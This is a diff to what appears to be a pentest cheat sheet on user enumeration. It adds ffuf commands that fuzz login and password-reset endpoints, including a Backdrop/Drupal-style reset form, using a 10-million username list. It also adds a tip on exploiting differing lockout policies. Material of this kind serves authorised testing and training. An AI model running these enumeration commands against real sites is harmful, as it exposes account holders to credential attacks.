@@ -6,8 +6,9 @@
 - Different error messages for valid vs invalid usernames
 - "Unknown user" vs "Invalid password"
 - Response timing differences
+- Password reset returns different messages for valid/invalid users
 
-### Exploit - ffuf User Enumeration
+### Exploit - ffuf User Enumeration (Login Form)
 
 ```bash
 ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
@@ -17,6 +18,30 @@ ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
      -d "username=FUZZ&password=invalid" \
      -fr "Unknown user"
 ```
+
+### Exploit - ffuf User Enumeration (Password Reset)
+
+Password reset endpoints often reveal valid usernames with different error messages.
+
+```bash
+# Generic password reset enumeration
+ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
+     -u http://TARGET/reset-password \
+     -X POST \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     -d "username=FUZZ" \
+     -fr "user not found"
+
+# CMS-specific (Backdrop/Drupal style)
+ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
+     -u "http://TARGET/?q=user/password" \
+     -X POST \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     -d "name=FUZZ&form_build_id=form-xxx&form_id=user_pass&op=Reset+password" \
+     -fr "is not recognized as a user name or an email address"
+```
+
+**Tip:** Try both login and password reset endpoints - they may have different rate limiting or lockout policies.
 
 ---
 
